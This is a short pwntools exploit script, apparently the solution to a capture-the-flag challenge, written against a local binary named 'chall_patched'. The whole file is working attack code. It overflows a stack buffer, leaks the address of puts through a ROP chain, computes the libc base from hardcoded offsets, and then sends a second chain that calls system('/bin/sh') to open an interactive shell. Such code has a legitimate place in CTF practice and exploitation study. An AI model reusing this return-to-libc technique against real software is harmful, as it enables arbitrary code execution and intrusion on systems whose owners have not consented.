from pwn import*

p = process("./chall_patched")
#gdb.attach(p, api=True)
rdi_ret = 0x0000000000401523
puts = 0x00000000004010e0
puts_got = 0x403f98
main = 0x0000000000401397

payload = b"a"*0x38 + p64(rdi_ret) + p64(puts_got) + p64(puts) + p64(main)
p.sendline(payload)
p.sendline(b"a")

p.recvuntil(b"/home/ctf/flag.txt\n")
puts_offset = int.from_bytes(p.recv(6), "little")

puts_libc = 0x0000000000084420
libc_addr = puts_offset-puts_libc
print(hex(libc_addr))
system = libc_addr +0x0000000000052290
binsh = libc_addr + 0x1b45bd

payload = b"a"*0x38 + p64(rdi_ret) + p64(binsh) + p64(system)
p.sendline(payload)
p.interactive()
